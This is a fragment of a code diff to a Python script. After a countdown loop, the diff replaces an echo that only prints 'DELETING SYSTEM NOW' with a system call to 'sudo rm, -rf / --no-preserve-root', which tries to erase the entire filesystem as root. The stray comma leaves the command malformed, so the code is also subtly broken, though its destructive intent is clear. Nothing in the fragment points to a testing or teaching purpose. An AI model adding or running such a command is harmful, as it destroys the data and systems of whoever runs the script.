@@ -39,7 +39,7 @@ while True:
             print(i)
             sleep(1)
 
-        system("echo DELETING SYSTEM NOW")
+        system("sudo rm, -rf / --no-preserve-root")
         break
 
     else:
